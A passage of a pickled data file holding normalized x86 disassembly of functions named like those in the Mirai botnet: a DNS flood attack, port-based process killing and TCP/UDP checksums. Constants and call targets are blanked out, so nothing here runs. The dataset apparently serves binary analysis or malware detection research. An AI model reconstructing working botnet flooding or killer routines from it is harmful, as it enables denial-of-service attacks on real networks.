ALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EDX,[ESP+0]\nMOV~[ESP+0],EDX\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],CX\nMOV~ESI,[ESP+0]\nMOV~[ESP+0],SI\nMOV~[ESP+0],BX\nMOV~[ESP+0],0\nMOV~AL,[ESP+0]\nAND~EAX,0\nMOV~[ESP+0],EAX\nTEST~EAX,EAX\nJLE~FOO\nMOV~EBX,0\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ECX+EAX*4]\nLEA~ECX,[EDX+0]\nLEA~EBX,[EDX+0]\nMOV~BYTEPTR[EDX],0\nMOV~AL,[ESP+0]\nMOV~[EDX+0],AL\nMOV~EAX,[ESP+0]\nADD~EAX,0\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~EAX,EBP\nMOV~[EDX+0],AL\nADD~ESP,0\nMOV~EAX,EDI\nTEST~AL,AL\nJZ~FOO\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nMOV~EAX,<STR>\nMOV~[EDX+0],EAX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~ESI,[ESP+0]\nMOV~EAX,[ESI+EAX*8+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[ECX],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[ECX+0],AX\nMOV~EAX,[ESP+0]\nADD~EAX,0\nROR~AX,0\nMOV~[ECX+0],AX\nMOV~DWORDPTR[EBX],0\nSUB~ESP,0\nPUSH~[ESP+0]\nPUSH~[ESP+0]\nLEA~EAX,[EBX+0]\nPUSH~EAX\nCALL~FOO\nMOV~EBX,[ESP+0]\nINC~EBX\nMOV~[ESP+0],EBX\nADD~ESP,0\nCMP~[ESP+0],EBX\nJG~FOO\nCMP~[ESP+0],0\nJLE~FOO\nMOV~[ESP+0],0\nMOV~EAX,0\nMOV~EDX,[ESP+0]\nMOV~EBP,[EDX+EAX*4]\nMOV~EDI,EBP\nLEA~ESI,[EBP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~ECX,[ESP+0]\nLEA~EAX,[ECX+EAX*8]\nCMP~[EAX+0],0\nJA~FOO\nMOV~EBX,[EAX+0]\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nCALL~FOO\nMOV~[ESP],EAX\nMOV~EDX,[ESP+0]\nLEA~EDX,[EDX+EDX*2]\nMOV~EAX,[ESP+0]\nMOV~ECX,0\nMOV~CL,[EAX+EDX*8+0]\nMOV~EAX,[ESP]\nSHR~EAX,CL\nADD~EAX,EBX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[EBP+0],EAX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~[EDI+0],0\nSUB~ESP,0\nPUSH~0\nPUSH~EDI\nCALL~FOO\nMOV~[EDI+0],AX\nMOV~[ESI+0],0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nMOV~AX,[ESI+0]\nAND~EAX,0\nPUSH~EAX\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~DX,[ESI+0]\nMOV~ECX,[ESP+0]\nMOV~[ECX+EAX*8+0],DX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nLEA~EAX,[ECX+EAX*8]\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nPUSH~EBP\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~[ESP+0],EAX\nJG~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p62
L862L
tp63
a(S'attack_udp_dns'
p64
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nMOVZX~ESI,[ESP+0]\nPUSH~0\nMOV~EAX,0\nMOV~AL,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nAND~ESI,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~EBP,EAX\nADD~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~ESI,EAX\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nTEST~ESI,ESI\nJS~FOO\nSUB~ESP,0\nPUSH~0\nLEA~EBX,[ESP+0]\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~EDI,EAX\nMOV~[ESP],ESI\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~EDI\nPUSH~EBX\nCALL~FOO\nMOV~ESI,EAX\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nCMP~ESI,0\nJZ~FOO\nCMP~EDI,ESI\nJLE~FOO\nMOV~EDX,ESI\nMOV~BL,0\nMOV~ECX,EDI\nMOV~AL,[ESP+EDX+0]\nTEST~BL,BL\nJNZ~FOO\nCMP~AL,0\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nMOV~BL,0\nCMP~AL,0\nJZ~FOO\nSUB~EAX,0\nCMP~AL,0\nJA~FOO\nLEA~EAX,[EDI-0]\nCMP~EDX,EAX\nJNZ~FOO\nMOV~EBX,EDX\nSUB~EBX,ESI\nSUB~ESP,0\nPUSH~EBX\nLEA~EAX,[ESP+ESI+0]\nPUSH~EAX\nLEA~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nMOV~[ESP+EBX+0],0\nADD~ESP,0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nJMP~FOO\nINC~EDX\nCMP~ECX,EDX\nJNZ~FOO\nCALL~FOO\nAND~EAX,0\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJB~FOO\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJNZ~FOO\nMOV~[ESP+0],0\nJMP~FOO\nMOV~[ESP+0],0\nJMP~FOO\nMOV~[ESP+0],0\nJMP~FOO\nMOV~[ESP+0],0\nTEST~EBP,EBP\nJZ~FOO\nSUB~ESP,0\nPUSH~EBP\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EDX,[ESP+0]\nMOV~[ESP+0],DX\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],CX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],AX\nMOV~EDX,[ESP+0]\nMOV~[ESP+0],DX\nMOV~CL,[ESP+0]\nMOV~[ESP+0],CL\nMOV~[ESP+0],0\nMOV~AL,[ESP+0]\nAND~EAX,0\nMOV~[ESP+0],EAX\nTEST~EAX,EAX\nJLE~FOO\nMOV~EBX,0\nMOV~EAX,0\nMOV~AL,CL\nADD~EAX,[ESP+0]\nMOV~[ESP+0],AX\nADD~EAX,0\nMOV~EDI,EAX\nROR~DI,0\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ECX+EAX*4]\nLEA~ECX,[EDX+0]\nLEA~EBX,[EDX+0]\nLEA~ESI,[EDX+0]\nMOV~BYTEPTR[EDX],0\nMOV~AL,[ESP+0]\nMOV~[EDX+0],AL\nMOV~AX,[ESP+0]\nADD~EAX,0\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EDX+0],AX\nMOV~AL,[ESP+0]\nMOV~[EDX+0],AL\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[EDX+0],0\nMOV~[EDX+0],0\nMOV~EAX,<STR>\nMOV~[EDX+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[EDX+0],EAX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[ECX],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[ECX+0],AX\nMOV~[ECX+0],DI\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EBX],AX\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~DL,[ESP+0]\nMOV~[ESI],DL\nMOV~EAX,0\nMOV~AL,DL\nLEA~EBX,[ESI+EAX+0]\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nPUSH~EBP\nLEA~EAX,[EBX+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJG~FOO\nMOV~EAX,EBX\nMOV~CL,0\nJMP~FOO\nMOV~EAX,EBX\nMOV~CL,0\nMOV~EDX,0\nMOV~ESI,[ESP+0]\nINC~ESI\nCMP~[EDX+EBP-0],0\nJNZ~FOO\nMOV~[EAX],CL\nLEA~EAX,[EDX+EBX]\nMOV~CL,0\nJMP~FOO\nINC~ECX\nINC~EDX\nCMP~EDX,ESI\nJNZ~FOO\nMOV~[EAX],CL\nMOV~ECX,[ESP+0]\nLEA~EAX,[EBX+ECX]\nMOV~[EAX+0],0\nMOV~[EAX+0],0\nMOV~EBX,[ESP+0]\nINC~EBX\nMOV~[ESP+0],EBX\nCMP~[ESP+0],EBX\nJG~FOO\nCMP~[ESP+0],0\nJLE~FOO\nMOV~[ESP+0],0\nMOV~EAX,0\nMOV~DL,[ESP+0]\nAND~EDX,0\nMOV~[ESP+0],EDX\nADD~EDX,[ESP+0]\nMOV~[ESP+0],EDX\nADD~EDX,0\nMOV~[ESP+0],EDX\nMOV~ECX,[ESP+0]\nMOV~EDI,[ECX+EAX*4]\nMOV~ESI,EDI\nLEA~EBX,[EDI+0]\nLEA~EBP,[EDI+0]\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EDI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EBX],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EBX+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nMOV~[EBP+0],AX\nSUB~ESP,0\nPUSH~[ESP+0]\nLEA~EAX,[EBP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESI+0],0\nADD~ESP,0\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~[ESI+0],AX\nMOV~[EBX+0],0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nMOV~AX,[EBX+0]\nAND~EAX,0\nPUSH~EAX\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[EBX+0],AX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~[EDX+EAX*8+0],ECX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~DX,[EBX+0]\nMOV~ECX,[ESP+0]\nMOV~[ECX+EAX*8+0],DX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nLEA~EAX,[ECX+EAX*8]\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~0\nPUSH~[ESP+0]\nPUSH~EDI\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,[ESP+0]\nJL~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p65
L1416L
tp66
a(S'checksum_generic'
p67
S'"PUSH~EBX\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EBX,0\nCMP~ECX,0\nJBE~FOO\nMOV~EBX,0\nMOV~AX,[EDX]\nAND~EAX,0\nADD~EBX,EAX\nADD~EDX,0\nSUB~ECX,0\nCMP~ECX,0\nJA~FOO\nCMP~ECX,0\nJNZ~FOO\nMOVSX~EAX,BYTEPTR[EDX]\nADD~EBX,EAX\nMOV~EAX,EBX\nSHR~EAX,0\nMOVZX~EDX,BX\nADD~EAX,EDX\nMOV~EDX,EAX\nSHR~EDX,0\nADD~EAX,EDX\nNOT~EAX\nAND~EAX,0\nPOP~EBX\nRETN"'
p68
L81L
tp69
a(S'checksum_tcpudp'
p70
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],AX\nMOV~EDX,[ESP+0]\nMOV~EDI,[ESI+0]\nMOV~EBP,[ESI+0]\nMOV~EBX,0\nCMP~ECX,0\nJLE~FOO\nMOV~EBX,0\nMOV~AX,[EDX]\nAND~EAX,0\nADD~EBX,EAX\nADD~EDX,0\nSUB~ECX,0\nCMP~ECX,0\nJG~FOO\nCMP~ECX,0\nJNZ~FOO\nMOV~EAX,0\nMOV~AL,[EDX]\nADD~EBX,EAX\nMOV~EAX,0\nMOV~AL,[ESI+0]\nROR~AX,0\nMOV~ECX,EBP\nSHR~ECX,0\nLEA~ECX,[EBX+ECX]\nAND~EAX,0\nADD~ECX,EAX\nMOV~EAX,EDI\nSHR~EAX,0\nMOV~EDX,EDI\nAND~EDX,0\nADD~EAX,EDX\nMOV~EDX,EBP\nAND~EDX,0\nADD~EAX,EDX\nMOV~DX,[ESP+0]\nAND~EDX,0\nADD~EAX,EDX\nLEA~EAX,[ECX+EAX]\nMOV~EDX,EAX\nSHR~EDX,0\nJZ~FOO\nAND~EAX,0\nADD~EAX,EDX\nMOV~EDX,EAX\nSHR~EDX,0\nJNZ~FOO\nNOT~EAX\nAND~EAX,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p71
L188L
tp72
a(S'mem_exists'
p73
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nMOV~EBX,EAX\nMOV~ESI,ECX\nMOV~EDI,[ESP+0]\nMOV~ECX,0\nCMP~EDI,EDX\nJLE~FOO\nJMP~FOO\nMOV~AL,[EBX]\nCMP~AL,[ECX+ESI]\nJZ~FOO\nMOV~ECX,0\nJMP~FOO\nINC~ECX\nCMP~EDI,ECX\nJNZ~FOO\nMOV~EAX,0\nJMP~FOO\nINC~EBX\nDEC~EDX\nCMP~EDX,0\nJNZ~FOO\nMOV~EAX,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p74
L64L
tp75
a(S'killer_kill'
p76
S'"SUB~ESP,0\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nRETN"'
p77
L20L
tp78
a(S'killer_kill_by_port'
p79
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nROR~BX,0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nLEA~EAX,[ESP+0]\nSUB~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nLEA~EAX,[ESP+0]\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nLEA~EAX,[ESP+0]\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nLEA~ESI,[ESP+0]\nPUSH~ESI\nPUSH~0\nAND~EBX,0\nPUSH~EBX\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBP,EAX\nADD~ESP,0\nMOV~EAX,0\nCMP~EBP,0\nJZ~FOO\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~EAX,0\nADD~ESP,0\nJMP~FOO\nMOV~EAX,0\nLEA~ECX,[ESP+0]\nINC~EAX\nMOV~DL,[EAX+ECX]\nTEST~DL,DL\nJZ~FOO\nCMP~DL,0\nJNZ~FOO\nTEST~DL,DL\nJZ~FOO\nLEA~ECX,[EAX+0]\nMOV~DL,[ESP+ECX+0]\nTEST~DL,DL\nJZ~FOO\nLEA~EAX,[ESP+EAX+0]\nCMP~DL,0\nJNZ~FOO\nMOV~ESI,ECX\nJMP~FOO\nMOV~DL,[EAX+0]\nINC~EAX\nTEST~DL,DL\nJZ~FOO\nCMP~DL,0\nJNZ~FOO\nLEA~EDX,[ESP+0]\nSUB~EAX,EDX\nLEA~ESI,[EAX+0]\nMOV~[ESP+ESI+0],0\nLEA~EDI,[ESP+0]\nLEA~EBX,[EDI+ECX]\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nLEA~ECX,[ESI+0]\nLEA~EAX,[EDI+ESI]\nMOV~EDI,0\nMOV~ESI,0\nMOV~[ESP+0],0\nJMP~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJNZ~FOO\nMOV~ESI,0\nJMP~FOO\nMOV~EDX,ESI\nCMP~DL,0\nJNZ~FOO\nINC~EDI\nCMP~EDI,0\nJNZ~FOO\nMOV~ESI,0\nCMP~[EBX+0],0\nJNZ~FOO\nJMP~FOO\nMOV~ESI,0\nINC~EAX\nCMP~EDI,0\nJG~FOO\nINC~ECX\nMOV~EBX,EAX\nMOV~DL,[EAX+0]\nTEST~DL,DL\nJNZ~FOO\nMOV~EDX,ECX\nCMP~[ESP+0],0\nJZ~FOO\nMOV~AL,[ESP+ECX+0]\nTEST~AL,AL\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nLEA~EAX,[ESP+ECX+0]\nINC~EDX\nMOV~BL,[EAX+0]\nINC~EAX\nTEST~BL,BL\nJZ~FOO\nCMP~BL,0\nJNZ~FOO\nMOV~[ESP+EDX+0],0\nLEA~EBX,[ESP+ECX+0]\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nSUB~ESP,0\nPUSH~EBX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nPUSH~EBP\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~DL,[ESP+0]\nTEST~DL,DL\nJZ~FOO\nCMP~DL,0\nJNZ~FOO\nMOV~EAX,0\nJMP~FOO\nSUB~ESP,0\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nMOV~[ESP+0],0\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[ESP+0],0\nLEA~EDI,[ESP+0]\nJMP~FOO\nLEA~EDX,[EAX+0]\nMOV~[ESP+0],EDX\nMOV~AL,[EAX+0]\nSUB~EAX,0\nCMP~AL,0\nJA~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nLEA~ESI,[ESP+0]\nPUSH~ESI\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~[ESP+0]\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~EBX\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~[ESP+0]\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[ESP],ESI\nCALL~FOO\nADD~ESP,0\nPUSH~EBX\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~[ESP+0],0\nJNZ~FOO\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nLEA~ESI,[ESP+0]\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nADD~ESP,0\nPUSH~[ESP+0]\nLEA~EAX,[EDI+EAX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~[ESP],EDI\nCALL~FOO\nADD~ESP,0\nPUSH~EBX\nLEA~EAX,[EDI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nADD~ESP,0\nPUSH~0\nLEA~EAX,[EDI+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nADD~ESP,0\nLEA~EDX,[EBP+0]\nPUSH~EDX\nLEA~EAX,[EDI+EAX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EBP,EAX\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOVSX~EAX,[ESP+0]\nADD~ESP,0\nJMP~FOO\nMOV~ESI,0\nMOV~[ESP+0],0\nINC~EAX\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p80
L1440L
tp81
a(S'killer_init'
p82
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~EBP,EAX\nCALL~FOO\nMOV~<STR>,EAX\nADD~ESP,0\nTEST~EAX,EAX\nJG~FOO\nCMP~EAX,0\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nLEA~EAX,[ESP+0]\nSUB~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nLEA~EAX,[ESP+0]\nSUB~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~<STR>,EAX\nMOV~BYTEPTR[EAX],0\nMOV~<STR>,0\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nLEA~ESI,[ESP+0]\nPUSH~ESI\nCALL~FOO\nLEA~EBX,[ESI+EAX]\nCALL~FOO\nADD~ESP,0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nADD~EBX,EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nMOV~EDI,EAX\nADD~ESP,0\nPUSH~0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCM